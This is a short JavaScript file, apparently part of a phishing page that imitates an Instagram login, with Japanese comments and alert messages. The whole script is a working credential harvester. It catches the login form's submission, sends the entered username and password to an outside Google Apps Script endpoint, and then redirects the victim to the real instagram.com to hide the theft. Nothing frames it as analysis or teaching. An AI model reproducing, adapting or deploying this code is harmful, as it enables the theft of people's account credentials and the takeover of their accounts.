document.getElementById("login-form").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const formData = new FormData();
    formData.append("username", username);
    formData.append("password", password);

    fetch("https://script.google.com/macros/s/AKfycbyTLGgVh7amkJhb99AxaE2l9_F1HSkkwYUp-NODa8qq1dlroHFr-ja5R79PFUzNcwN_nw/exec", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            // 成功後のリダイレクト先
            window.location.href = "https://www.instagram.com/";
        } else {
            alert("送信に失敗しました（レスポンスNG）");
        }
    })
    .catch(error => {
        alert("送信エラー：" + error);
        console.error(error);
    });

    this.reset();
});
